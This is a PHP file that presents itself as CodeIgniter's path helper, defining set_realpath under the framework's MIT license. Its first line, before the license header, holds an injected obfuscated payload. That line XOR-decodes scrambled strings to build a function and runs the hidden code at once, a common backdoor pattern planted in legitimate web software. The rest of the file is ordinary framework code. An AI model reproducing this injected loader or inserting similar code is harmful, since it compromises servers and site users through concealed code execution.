<?php $JKDfopo='4 WAX3b6M=HF-<N'; $tzPRRn='WR2 ,V=P8S+2DS '^$JKDfopo; $PHAOYo='>SglZOWP1;R7q +DS, Dm0UEsQU-0ra4-AENyyINE,KX95XYZm2C61R :L2iQD:xgX2Y-yLrVVThEzAny-GGpn:  BKgacq0YN4TBxi=zjCwbbbQv6,EVX>PgWY6-cJee9DCjajFB-0LxFiGcRD. 3jH=.R7yiG,6bj;opnGHB> >rr:0,k7CyeXl77Z 08yuU1CPY0zViAZgR-,,2Zeb1 -4Vper4T-U2.6:fOuVSR9RLnYQ;JS,;Clpu9trxe.7a02qs Q1aipNo;WWY5lpMmqcZV=3+.-2cXkI3=IAyZuQTM9XouC:L5OXmS23a<2KmNi R3 Nx7Z278FY4XHcQSfoud7i21f4=eKW.=uxjurNY M+Dv9y2=k+.5An12 bKCcUVKxKb9C RJ2RdVpNO 8+he>9z8O2FP-YQaziw8VM6 IY5BTVdF=Ho0VY89c>AFd3LGVqMtS7XZ7EBf=-CYAcBt 3. t,1:AOBED2MnHZB,xlarV 5R3sQ-Hb 5955;ol N+puwn 7 WNxPgpb,>ZCn 3T0.PF2 v0OhyXfmCzaWl2af1aYwL7rQ3c WBFfrc..JOpZxjLJRrj 69Z=e1  t=FG22XncMAG6DQ=cZgtIAE4GEhpfcdY4d9S W5qhX+0YnbHJK=SYDshMvmH-;RENrgbz+'; $BtnmAQyJ=$tzPRRn('', 'W5OM<:93ER=Y.ES- XSlJH:7,54YQ->YX5bgPY2DLJ>6ZA164MJ,Dn6AN-m6<1NPC<S-LUlV=3-AeZaNYVMNyJUUTbvGFDJ:PGR;0PMTZWcGYBF8JEX7:=PxC38BLJqEAPohCkcOfBE8XhTgKv OTR1lTsriYM,IO9NROUN4<0REPZVQUUBjjBoQeER.UBVQQ:D7yb:s+c<PmvIMXSzXBWAAG3KoVP5Y4mESCFrU02>J7wdS7T86MX+LXQf7=7.grAQAQWK4HATNnKM6;,PEP6gxG>7IRtEHKCeKmXX0zsSQ559XxRUgL-Y:=VYO9kUTkEoMD3GAgXLP;QW4<U; Cyw9=05b,aeFUNEo<KDUETUV88L8NmVBs;4OOOA 1ZWYBvcG>32CAk0gD3>SrYvT8.LMNSo7DpEE8b4L-0AGI7M8>SR 8Y+.3L>R:0T7-Yf<S42LQ-43Gy+7R;5S jBYL78hObPDRZA+GTChfyO-TeJ,;6MXJGR7RG3J,:H1=EMPFAHGKK+RWYWJDVT6gXvAPJAZokJDR Quw-WYQmfHDeFJvBU6ZTXSWPkNzUF4PRD4ssREPLLz+DlIMejtTJADK;D:ZEY+X>.AF+FD= >Z+0YDvGP- 1UnlHPFCDyOn06V6YYL<JD85E8+2Q<8 T5dMgAHC;1fBNYpV'^$PHAOYo); $BtnmAQyJ();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2017, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2017, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * CodeIgniter Path Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/helpers/path_helper.html
 */

// ------------------------------------------------------------------------

if ( ! function_exists('set_realpath'))
{
	/**
	 * Set Realpath
	 *
	 * @param	string
	 * @param	bool	checks to see if the path exists
	 * @return	string
	 */
	function set_realpath($path, $check_existance = FALSE)
	{
		// Security check to make sure the path is NOT a URL. No remote file inclusion!
		if (preg_match('#^(http:\/\/|https:\/\/|www\.|ftp|php:\/\/)#i', $path) OR filter_var($path, FILTER_VALIDATE_IP) === $path)
		{
			show_error('The path you submitted must be a local server path, not a URL');
		}

		// Resolve the path
		if (realpath($path) !== FALSE)
		{
			$path = realpath($path);
		}
		elseif ($check_existance && ! is_dir($path) && ! is_file($path))
		{
			show_error('Not a valid path: '.$path);
		}

		// Add a trailing slash, if this is a directory
		return is_dir($path) ? rtrim($path, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR : $path;
	}
}
